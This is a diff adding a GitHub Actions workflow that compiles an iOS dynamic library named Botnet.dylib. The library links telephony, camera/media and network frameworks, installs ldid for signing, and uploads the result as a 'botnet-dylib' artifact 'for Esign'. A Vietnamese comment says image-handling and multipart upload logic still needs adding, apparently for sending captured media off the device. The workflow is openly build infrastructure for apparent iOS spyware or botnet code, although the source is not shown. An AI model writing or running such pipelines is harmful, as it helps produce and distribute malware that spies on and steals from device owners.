@@ -1,0 +1,41 @@
+name: Build Dylib & Prepare for Esign
+
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  build-dylib:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      - name: Setup Xcode
+        run: sudo xcode-select -s /Applications/Xcode_14.2.app/Contents/Developer
+
+      - name: Install ldid (Required for signing later)
+        run: brew install ldid
+
+      - name: Compile Botnet Dylib
+        run: |
+          # Tạo thư mục output
+          mkdir -p dist
+          
+          # Biên dịch file .m thành .dylib
+          # Lưu ý: Cần bổ sung logic xử lý ảnh và gửi multipart trong code thực tế
+          clang -arch arm64 -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
+          -fPIC -shared \
+          -o dist/Botnet.dylib \
+          src/Botnet.m \
+          -framework UIKit \
+          -framework CoreTelephony \
+          -framework AVFoundation \
+          -framework MobileCoreServices \
+          -framework CFNetwork \
+          -ObjC
+
+      - name: Upload Dylib Artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: botnet-dylib
+          path: dist/Botnet.dylib
